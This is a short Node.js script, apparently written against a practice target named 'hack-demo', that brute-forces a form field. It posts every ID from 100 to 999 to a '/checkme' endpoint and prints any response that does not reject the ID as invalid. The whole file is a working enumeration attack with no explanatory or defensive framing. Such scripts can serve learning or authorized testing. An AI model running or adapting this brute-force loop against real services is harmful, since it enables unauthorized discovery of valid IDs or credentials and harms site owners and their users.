const request = require('request');
const url = 'http://hack-demo-hack-demo2.7e14.starter-us-west-2.openshiftapps.com/checkme';

for (let myId = 100; myId < 1000; myId++) {
  request.post({url, form: {myId}}, (error, response, body) => {
    if(body.toString().indexOf('is not a valid') === -1) {
      console.log(body);
    }
  });
}